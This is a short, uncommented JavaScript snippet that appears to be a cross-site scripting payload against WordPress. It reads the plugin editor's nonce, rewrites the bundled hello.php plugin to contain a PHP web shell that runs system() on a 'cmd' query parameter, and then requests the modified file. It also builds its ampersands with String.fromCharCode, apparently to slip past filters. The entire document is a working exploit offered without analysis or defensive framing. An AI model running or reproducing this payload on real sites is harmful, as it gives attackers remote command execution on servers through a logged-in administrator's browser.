p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
a = new XMLHttpRequest();
a.onreadystatechange = function() {
    if (a.readyState == XMLHttpRequest.DONE) {
separated=a.responseText.split('input type="hidden" id="nonce" name="nonce" value="')
final=separated[1].split('" /><input type="hidden"')[0];
params = 'nonce='+final+String.fromCharCode(38)+'newcontent=<?php system($_GET[cmd]);'+String.fromCharCode(38)+'action=edit-theme-plugin-file'+String.fromCharCode(38)+'file=hello.php'+String.fromCharCode(38)+'plugin=hello.php'
b = new XMLHttpRequest();
b.open('POST', p, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(params);
b.onreadystatechange = function(){
   if (this.readyState == 4) {
      fetch('/wp-content/plugins/hello.php');
   }
}
}}
a.open('GET', p+q, 0);
a.send();